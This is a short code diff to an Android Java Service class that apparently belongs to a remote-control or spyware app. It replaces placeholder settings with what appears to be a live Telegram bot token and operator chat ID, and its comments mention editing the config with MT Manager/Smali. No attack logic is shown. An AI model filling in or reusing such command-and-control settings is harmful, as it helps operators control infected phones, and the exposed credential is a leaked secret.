@@ -58,8 +58,8 @@ public class inq extends Service {
     // ══════════════════════════════════════════════
     //  CONFIG  —  edit with MT Manager / Smali
     // ══════════════════════════════════════════════
-    static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
-    static String OWNER_ID   = "YOUR_CHAT_ID_HERE";   // Telegram chat_id of operator
+    static String BOT_TOKEN  = "8846771755:AAHpLMb07quH2TR9Vw5m40RUHzPOOTtBdR8";
+    static String OWNER_ID   = "7507787272";   // Telegram chat_id of operator
     // ══════════════════════════════════════════════
 
     private static volatile boolean running  = false;
